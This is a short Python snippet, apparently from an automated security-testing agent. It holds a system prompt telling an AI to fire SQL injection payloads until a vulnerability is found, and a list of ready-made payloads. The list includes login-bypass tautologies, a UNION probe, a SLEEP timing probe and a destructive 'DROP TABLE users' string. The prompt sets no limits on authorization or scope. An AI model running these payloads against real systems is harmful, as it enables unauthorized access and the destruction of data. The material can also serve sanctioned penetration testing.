SQLI_SYSTEM_PROMPT = """
When testing for SQL injection, try multiple payloads (e.g., ' OR 1=1--, "; DROP TABLE users;--, etc.).
After each test, analyze the output for errors, unexpected data, or signs of injection.
Continue until a vulnerability is found or all payloads are exhausted.
"""
SQLI_PAYLOADS = [
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR 'a'='a",
    '" OR "a"="a',
    "' OR 1=1#",
    'admin"--',
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    '"; DROP TABLE users;--',
    "' OR SLEEP(5)--",
] 